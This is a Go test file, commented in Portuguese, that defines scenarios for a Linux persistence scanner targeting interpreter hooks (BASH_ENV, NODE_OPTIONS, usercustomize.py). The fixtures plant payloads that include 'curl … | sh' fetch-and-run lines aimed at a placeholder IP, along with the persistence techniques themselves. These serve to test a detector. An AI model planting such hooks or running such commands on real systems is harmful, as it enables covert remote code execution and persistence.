package scenario

// Hooks de INTERPRETADOR — o LD_PRELOAD de quem não é ELF.
//
// A LACUNA VEIO DE FORA, e é por isso que ela vale mais que as que eu mesmo
// escolheria. O atomic-red-team tem 122 técnicas com teste para Linux; 95 não
// estavam no meu mapa. A maioria é comportamento que retrato nenhum vê — rodar
// `whoami` não deixa artefato —, mas quinze tocavam caminho de persistência, e
// uma apontou para algo que eu deveria ter deduzido sozinho:
//
//	a ferramenta trata LD_PRELOAD como quebra de confiança, com razão
//	e nunca fez a MESMA pergunta a python, node, perl, ruby, java e bash
//
// Ponto cego de enquadramento: quem escreveu os checks e quem escreveu os
// cenários eram a mesma pessoa, olhando para o mesmo lado. Corpus de fora é o
// que enxerga isso, e é o motivo de ele existir neste projeto.

func init() {
	Register(Scenario{
		ID:   "L1-bash-env-global",
		Desc: "BASH_ENV em /etc/environment: todo bash não-interativo executa o arquivo",
		// O mais silencioso da família. Nenhum arquivo de perfil é tocado,
		// nenhuma unit é editada, nenhum cron é criado — e todo script que o
		// cron dispara passa a executar o hook antes da primeira linha dele.
		Images: matriz,
		Plant: `mkdir -p /opt/.cache
			printf '#!/bin/sh\ncurl -s http://198.51.100.7/x | sh\n' > /opt/.cache/.profile.sh
			chmod +x /opt/.cache/.profile.sh
			echo 'BASH_ENV=/opt/.cache/.profile.sh' >> /etc/environment`,
		Expect: []Expect{
			{ID: "persist.interpreter_hook", Sev: "CRITICAL", Subject: "/etc/environment"},
			{ID: "persist.interpreter_hook", Evidence: "todo bash não-interativo"},
			// e o peso vem de ONDE foi definido, não do nome da variável
			{ID: "persist.interpreter_hook", Evidence: "lido a cada sessão"},
		},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "L2-node-options-em-unit",
		Desc: "NODE_OPTIONS=--require numa unit: o serviço carrega módulo alheio",
		// A forma que aparece em comprometimento de cadeia de suprimentos: não
		// se toca no código da aplicação, toca-se no ambiente dela. Um `git
		// diff` no repositório do serviço não mostra nada.
		Images: matriz,
		Plant: `mkdir -p /opt/app /etc/systemd/system
			printf 'require("http").get("http://198.51.100.7/x")\n' > /opt/app/telemetry.js
			printf '[Service]\nExecStart=/usr/bin/node /opt/app/server.js\nEnvironment="NODE_OPTIONS=--require /opt/app/telemetry.js"\n' \
				> /etc/systemd/system/app.service`,
		Expect: []Expect{
			{ID: "persist.interpreter_hook", Sev: "CRITICAL", Subject: "app.service"},
			{ID: "persist.interpreter_hook", Evidence: "--require"},
			// O que levanta para CRITICAL é o ALVO, não o nome da variável: o
			// mesmo NODE_OPTIONS apontando para um arquivo COM dono de pacote
			// é a forma documentada de instalar APM.
			{ID: "persist.interpreter_hook", Evidence: "nenhum pacote reivindica"},
		},
		// As ASPAS não são detalhe: sem elas o próprio systemd cortaria no
		// espaço e o `--require` ficaria sem argumento. A primeira versão deste
		// cenário estava errada, e o parser é que estava certo.
		// Está numa unit e não em /etc/environment: atinge um serviço, não o
		// host inteiro. A severidade tem que refletir isso, e o que a levanta
		// para CRITICAL é o ALVO — /opt/app não é gravável por qualquer um, mas
		// nenhum pacote o reivindica.
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "L3-python-hook-vs-o-do-pacote",
		Desc: "usercustomize.py do invasor ao lado do sitecustomize.py que o dpkg entregou",
		// O cenário que exige a contraparte legítima presente, e por isso roda
		// na imagem com serviços — que tem base dpkg de verdade.
		//
		// Acusar a PRESENÇA de sitecustomize.py acusaria toda instalação de
		// python do mundo: o Debian entrega /usr/lib/python3.11/sitecustomize.py
		// (link para /etc/python3.11/) pelo libpython3.11-minimal. Medido antes
		// de escrever o check. O que separa é a pergunta de sempre.
		Images: servicos,
		Plant: `d=$(ls -d /usr/lib/python3.[0-9]* 2>/dev/null | head -1)
			mkdir -p "$d"
			# o do PACOTE fica onde está, intocado
			printf 'import os\nos.system("curl -s http://198.51.100.7/x|sh")\n' > "$d/usercustomize.py"`,
		Expect: []Expect{
			{ID: "integrity.no_package_owner", Subject: "usercustomize.py"},
			{ID: "integrity.no_package_owner", Evidence: "hook de inicialização do python"},
		},
		// O sitecustomize.py do pacote NÃO pode aparecer: ele tem dono.
		ForbidOutput:   []string{"sitecustomize.py"},
		Exit:           2,
		MustBeComplete: true,
	})

	Register(Scenario{
		ID:   "L4-fabrica-com-python-instalado",
		Desc: "python instalado e nenhum hook plantado: estado de fábrica não é ataque",
		// O contrapeso do L3, e o que impede o check de acusar todo host que
		// tem python. Sem ele, a primeira instalação de um servidor real
		// derrubaria a ferramenta inteira.
		Images: servicos,
		// A imagem JÁ traz python3, com o sitecustomize.py do pacote. O
		// plantio é vazio de propósito: o cenário é sobre o que NÃO acontece.
		Plant:          `true`,
		Forbid:         []string{"persist.interpreter_hook"},
		ForbidOutput:   []string{"sitecustomize.py", "usercustomize.py"},
		MaxWarn:        0,
		Exit:           0,
		MustBeComplete: true,
	})
}
